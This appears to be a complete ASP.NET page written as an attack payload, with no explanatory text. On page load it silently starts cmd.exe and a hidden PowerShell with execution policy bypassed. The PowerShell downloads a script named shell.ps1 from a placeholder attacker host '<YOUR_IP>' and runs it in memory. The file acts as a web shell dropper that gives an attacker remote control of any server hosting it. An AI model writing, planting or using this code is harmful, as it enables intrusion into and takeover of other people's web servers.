<%@ Page Language="C#" %>
<script runat="server">
    void Page_Load(Object sender, EventArgs e) {
        System.Diagnostics.Process.Start("cmd.exe", "/c powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/shell.ps1')\"");
    }
</script>
